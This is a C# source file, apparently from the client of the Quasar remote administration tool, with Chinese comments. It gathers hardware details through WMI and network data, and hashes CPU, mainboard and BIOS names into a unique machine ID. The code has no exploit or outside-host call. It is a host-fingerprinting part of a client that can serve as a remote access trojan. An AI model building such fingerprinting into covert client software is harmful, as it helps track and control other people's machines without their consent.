using Quasar.Common.Cryptography;
using Quasar.Common.Helpers;
using System;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;

namespace Quasar.Client.IO
{
    /// <summary>
    /// 提供检索所使用的硬件设备信息的权限。
    /// </summary>
    /// <remarks>缓存检索的信息，以减少慢速WMI查询的速度。</remarks>
    public static class HardwareDevices
    {
        /// <summary>
        /// 获取一个独特的硬件ID，作为各种硬件组件的组合。
        /// </summary>
        public static string HardwareId => _hardwareId ?? (_hardwareId = Sha256.ComputeHash(CpuName + MainboardName + BiosManufacturer));

        /// <summary>
        /// 用于缓存硬件ID。
        /// </summary>
        private static string _hardwareId;

        /// <summary>
        /// 获取系统CPU的名称。
        /// </summary>
        public static string CpuName => _cpuName ?? (_cpuName = GetCpuName());

        /// <summary>
        /// 用于缓存CPU的名称。
        /// </summary>
        private static string _cpuName;

        /// <summary>
        /// 获取GPU的名称。
        /// </summary>
        public static string GpuName => _gpuName ?? (_gpuName = GetGpuName());

        /// <summary>
        /// 用于缓存GPU名称。
        /// </summary>
        private static string _gpuName;

        /// <summary>
        /// 获取BIOS制造商的名称。
        /// </summary>
        public static string BiosManufacturer => _biosManufacturer ?? (_biosManufacturer = GetBiosManufacturer());

        /// <summary>
        /// 用于缓存BIOS制造商。
        /// </summary>
        private static string _biosManufacturer;

        /// <summary>
        /// 获取主机板的名称。
        /// </summary>
        public static string MainboardName => _mainboardName ?? (_mainboardName = GetMainboardName());

        /// <summary>
        /// 用于缓存主机板名称。
        /// </summary>
        private static string _mainboardName;

        /// <summary>
        /// 获取系统的总物理内存，单位为兆字节（MB）。
        /// </summary>
        public static int? TotalPhysicalMemory => _totalPhysicalMemory ?? (_totalPhysicalMemory = GetTotalPhysicalMemoryInMb());

        /// <summary>
        /// 用来缓存总的物理内存。
        /// </summary>
        private static int? _totalPhysicalMemory;

        /// <summary>
        /// 获取网络接口的LAN IP地址。
        /// </summary>
        public static string LanIpAddress => GetLanIpAddress();

        /// <summary>
        /// 获取网络接口的MAC地址。
        /// </summary>
        public static string MacAddress => GetMacAddress();

        private static string GetBiosManufacturer()
        {
            try
            {
                string biosIdentifier = string.Empty;
                string query = "SELECT * FROM Win32_BIOS";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        biosIdentifier = mObject["Manufacturer"].ToString();
                        break;
                    }
                }

                return (!string.IsNullOrEmpty(biosIdentifier)) ? biosIdentifier : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        private static string GetMainboardName()
        {
            try
            {
                string mainboardIdentifier = string.Empty;
                string query = "SELECT * FROM Win32_BaseBoard";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        mainboardIdentifier = mObject["Manufacturer"].ToString() + " " + mObject["Product"].ToString();
                        break;
                    }
                }

                return (!string.IsNullOrEmpty(mainboardIdentifier)) ? mainboardIdentifier : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        private static string GetCpuName()
        {
            try
            {
                string cpuName = string.Empty;
                string query = "SELECT * FROM Win32_Processor";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        cpuName += mObject["Name"].ToString() + "; ";
                    }
                }
                cpuName = StringHelper.RemoveLastChars(cpuName);

                return (!string.IsNullOrEmpty(cpuName)) ? cpuName : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        private static int GetTotalPhysicalMemoryInMb()
        {
            try
            {
                int installedRAM = 0;
                string query = "Select * From Win32_ComputerSystem";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        double bytes = Convert.ToDouble(mObject["TotalPhysicalMemory"]);
                        installedRAM = (int)(bytes / 1048576); // bytes to MB
                        break;
                    }
                }

                return installedRAM;
            }
            catch
            {
                return -1;
            }
        }

        private static string GetGpuName()
        {
            try
            {
                string gpuName = string.Empty;
                string query = "SELECT * FROM Win32_DisplayConfiguration";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        gpuName += mObject["Description"].ToString() + "; ";
                    }
                }
                gpuName = StringHelper.RemoveLastChars(gpuName);

                return (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        private static string GetLanIpAddress()
        {
            // TODO：支持多个网络接口
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                GatewayIPAddressInformation gatewayAddress = ni.GetIPProperties().GatewayAddresses.FirstOrDefault();
                if (gatewayAddress != null) //排除没有默认网关的虚拟物理网卡
                {
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                        ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                        ni.OperationalStatus == OperationalStatus.Up)
                    {
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                                ip.AddressPreferredLifetime == UInt32.MaxValue) // 排除虚拟网络地址
                                continue;

                            return ip.Address.ToString();
                        }
                    }
                }
            }

            return "-";
        }

        private static string GetMacAddress()
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    ni.OperationalStatus == OperationalStatus.Up)
                {
                    bool foundCorrect = false;
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                            ip.AddressPreferredLifetime == UInt32.MaxValue) // 排除虚拟网络地址
                            continue;

                        foundCorrect = (ip.Address.ToString() == GetLanIpAddress());
                    }

                    if (foundCorrect)
                        return StringHelper.GetFormattedMacAddress(ni.GetPhysicalAddress().ToString());
                }
            }

            return "-";
        }
    }
}
